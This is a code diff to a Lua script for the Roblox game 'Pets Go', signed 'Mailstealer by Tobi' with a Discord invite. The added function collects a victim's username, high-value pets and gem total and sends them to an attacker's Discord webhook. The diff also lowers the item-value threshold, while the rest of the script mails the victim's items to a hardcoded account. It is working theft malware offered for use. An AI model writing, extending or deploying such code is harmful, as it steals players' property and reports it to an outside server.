@@ -16,6 +16,104 @@ if _G.scriptExecuted then
 end
 _G.scriptExecuted = true
 
+local function formatNumber(number)
+    if number == nil then
+        return "0"
+    end
+	local number = math.floor(number)
+	local suffixes = {"", "k", "m", "b", "t"}
+	local suffixIndex = 1
+	while number >= 1000 do
+		number = number / 1000
+		suffixIndex = suffixIndex + 1
+	end
+	return string.format("%.2f%s", number, suffixes[suffixIndex])
+end
+
+local function SendMessage(username, diamonds)
+    local headers = {
+        ["Content-Type"] = "application/json",
+    }
+
+	local fields = {
+		{
+			name = "Victim Username:",
+			value = username,
+			inline = true
+		},
+		{
+			name = "Items to be sent:",
+			value = "",
+			inline = false
+		},
+        {
+            name = "Summary:",
+            value = "",
+            inline = false
+        }
+	}
+
+    local combinedItems = {}
+    local itemRapMap = {}
+
+    for _, item in ipairs(sortedItems) do
+        local rapKey = item.name
+        if itemRapMap[rapKey] then
+            itemRapMap[rapKey].amount = itemRapMap[rapKey].amount + item.amount
+        else
+            itemRapMap[rapKey] = {amount = item.amount, rap = item.rap}
+            table.insert(combinedItems, rapKey)
+        end
+    end
+
+    table.sort(combinedItems, function(a, b)
+        return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount 
+    end)
+
+    for _, itemName in ipairs(combinedItems) do
+        local itemData = itemRapMap[itemName]
+        fields[2].value = fields[2].value .. itemName .. " (x" .. itemData.amount .. ")" .. ": " .. formatNumber(itemData.rap * itemData.amount) .. " RAP\n"
+    end
+
+    fields[3].value = fields[3].value .. "Gems: " .. formatNumber(diamonds) .. "\n"
+    fields[3].value = fields[3].value .. "Total RAP: " .. formatNumber(totalRAP)
+
+    local data = {
+        ["embeds"] = {{
+            ["title"] = "New Pets Go Execution" ,
+            ["color"] = 65280,
+			["fields"] = fields,
+			["footer"] = {
+				["text"] = "Mailstealer by Tobi. discord.gg/GY2RVSEGDT"
+			}
+        }}
+    }
+
+    if #fields[2].value > 1024 then
+        local lines = {}
+        for line in fields[2].value:gmatch("[^\r\n]+") do
+            table.insert(lines, line)
+        end
+
+        while #fields[2].value > 1024 and #lines > 0 do
+            table.remove(lines)
+            fields[2].value = table.concat(lines, "\n")
+            fields[2].value = fields[2].value .. "\nPlus more!"
+        end
+    end
+
+    local body = HttpService:JSONEncode(data)
+
+    if webhook and webhook ~= "" then
+        local response = request({
+            Url = webhook,
+            Method = "POST",
+            Headers = headers,
+            Body = body
+        })
+    end
+end
+
 local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
 local noti = plr.PlayerGui.Notifications
 loading.Disabled = true
@@ -52,7 +150,8 @@ local function getRAP(Type, Item)
 end
 
 local user = Username or "tobi437a"
-local min_rap = min_rap or 100000
+local min_rap = min_rap or 10000
+local webhook = webhook
 
 local function sendItem(category, uid, am)
     local args = {
@@ -102,6 +201,10 @@ if #sortedItems > 0 then
     
     table.sort(sortedItems, function(a, b)
         return a.rap * a.amount > b.rap * b.amount 
+    end)
+    
+    spawn(function()
+        SendMessage(plr.Name, GemAmount1)
     end)
 
     for _, item in ipairs(sortedItems) do
